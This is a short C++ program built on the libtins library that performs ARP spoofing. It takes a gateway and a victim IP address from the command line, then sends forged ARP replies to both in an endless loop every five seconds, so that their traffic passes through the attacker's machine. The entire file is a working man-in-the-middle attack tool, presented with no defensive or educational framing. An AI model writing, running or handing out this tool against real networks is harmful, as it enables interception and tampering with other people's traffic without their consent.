#include<iostream>
#include<unistd.h>
#include<tins/tins.h>
#include<pthread.h>

using namespace std;
using namespace Tins;
typedef struct ThreadArgs{
    NetworkInterface iface;
    IPv4Address gw;
    IPv4Address victim;
    NetworkInterface::Info info;
}THREADARGS;

void *doArpSpoofing(void* args)
{
    THREADARGS *targ = (THREADARGS*)args;
    PacketSender send;
    EthernetII::address_type gw_hw,victim_hw;

    gw_hw = Utils::resolve_hwaddr(targ->iface,targ->gw,send);
    victim_hw = Utils::resolve_hwaddr(targ->iface,targ->victim,send);

    cout << "[*] Using Gateway HW Address   " << gw_hw << endl;
    cout << "[*] Using Victim HW Address    " << victim_hw << endl;
    cout << "[*] Using Own HW Address       " << targ->info.hw_addr << endl;
    ARP gw_arp = ARP(targ->gw,targ->victim,gw_hw,targ->info.hw_addr);
    ARP victim_arp = ARP(targ->victim,targ->gw,victim_hw,targ->info.hw_addr);
    gw_arp.opcode(ARP::REPLY);
    victim_arp.opcode(ARP::REPLY);
    EthernetII to_gw = EthernetII(gw_hw,targ->info.hw_addr) / gw_arp;
    EthernetII to_victim = EthernetII(victim_hw,targ->info.hw_addr) / victim_arp;

    while(true){
        cout << "[-] Send Corrupt ARP" << endl;
        send.send(to_gw,targ->iface);
        send.send(to_victim,targ->iface);
        sleep(5);
    }
    exit(0);
}

int main(int argc, char* argv[])
{
    pthread_t thread;
    IPv4Address gw, victim;
    int i;
    if(argc != 3){
        cout << "[-] Usage " << argv[0] << " <Gateway> <Victim>" << endl;
        return 1;
    }
    try {
        gw = argv[1];
        victim = argv[2];
    }
    catch(...){
        cout << "[!] Wrong IP Finded!" << endl;
        return 2;
    }
    NetworkInterface iface;
    NetworkInterface::Info info;
    try {
        iface = gw;
        info = iface.info();
    }
    catch(runtime_error& e){
        cout << "[!] " << e.what() << endl;
        return 3;
    }
    cout << "[-] Starting ARP Spoofing..." << endl;
    THREADARGS targ;
    targ.gw = gw;
    targ.iface = iface;
    targ.victim = victim;
    targ.info = info;

    try {
        pthread_create(&thread,NULL,doArpSpoofing,&targ);
        pthread_join(thread,(void**)&i);
    }
    catch(runtime_error& e){
        cout << "[!] " << e.what() << endl;
        return 4;
    }

    return 0;
}
